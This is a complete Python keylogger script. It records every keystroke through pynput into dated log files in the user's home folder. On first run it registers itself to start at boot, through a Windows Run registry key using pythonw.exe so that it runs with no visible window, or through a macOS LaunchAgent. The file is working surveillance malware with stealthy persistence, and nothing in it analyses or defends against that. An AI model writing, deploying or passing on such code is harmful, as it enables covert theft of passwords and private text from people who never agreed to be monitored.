import os
import sys
import datetime
from pynput import keyboard

# --- CONFIGURATION ---
LOG_DIR = os.path.join(os.path.expanduser("~"), "Keylogs")
# Create the logging directory safely if it doesn't already exist
os.makedirs(LOG_DIR, exist_ok=True)

# Global variables for state management
word_buffer = []
current_date_str = ""

# --- 1. DAILY LOG ROTATION FUNCTION ---
def get_current_date():
    """Returns current date formatted as YYYY_MM_DD."""
    return datetime.datetime.now().strftime("%Y_%m_%d")

def write_buffer_to_file():
    """Flushes memory buffer into the designated daily text file."""
    global word_buffer, current_date_str
    if word_buffer:
        full_word = "".join(word_buffer)
        
        # Determine the target filename based on the exact active date
        target_date = get_current_date()
        file_path = os.path.join(LOG_DIR, f"log_{target_date}.txt")
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Open file in append mode, write the entry, and close it immediately
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} - {full_word}\n")
            
        word_buffer.clear()

# --- 2. AUTO-STARTUP INSTALLATION FUNCTION ---
def add_to_startup():
    """Detects the operating system and registers the script for auto-boot."""
    script_path = os.path.abspath(sys.argv[0])
    
    # Windows Startup Implementation
    if sys.platform == "win32":
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            # Open the registry key for the current user's startup applications
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            # Use 'pythonw.exe' path instead of 'python.exe' to enforce background invisibility
            pythonw_exe = sys.executable.replace("python.exe", "pythonw.exe")
            launch_command = f'"{pythonw_exe}" "{script_path}"'
            
            winreg.SetValueEx(reg_key, "PythonDailyKeylogger", 0, winreg.REG_SZ, launch_command)
            winreg.CloseKey(reg_key)
            print("[+] Successfully added to Windows Registry Startup.")
        except Exception as e:
            print(f"[-] Windows Startup Registry configuration failed: {e}")
            
    # macOS Startup Implementation
    elif sys.platform == "darwin":
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://apple.com">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.dailykeylogger</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
        launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
        plist_path = os.path.join(launch_agents_dir, "com.user.dailykeylogger.plist")
        try:
            with open(plist_path, "w") as f:
                f.write(plist_content)
            print("[+] Successfully created macOS LaunchAgent plist.")
        except Exception as e:
            print(f"[-] macOS LaunchAgent configuration failed: {e}")

# --- KEYBOARD LISTENER LOGIC ---
def on_press(key):
    global word_buffer
    try:
        word_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            write_buffer_to_file()
        elif key == keyboard.Key.enter:
            word_buffer.append(" [ENTER]")
            write_buffer_to_file()
        elif key == keyboard.Key.backspace:
            if word_buffer:
                word_buffer.pop()
        elif key in [keyboard.Key.tab, keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            pass
        else:
            write_buffer_to_file()
            # Log standalone special keys directly
            word_buffer.append(f"[{str(key).upper()}]")
            write_buffer_to_file()

def on_release(key):
    if key == keyboard.Key.esc:
        write_buffer_to_file()
        return False

# --- EXECUTIVE EXECUTION CRITERIA ---
if __name__ == "__main__":
    # Run the startup routine once upon initial manual script execution
    add_to_startup()
    
    # Initialize background system hardware hook
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
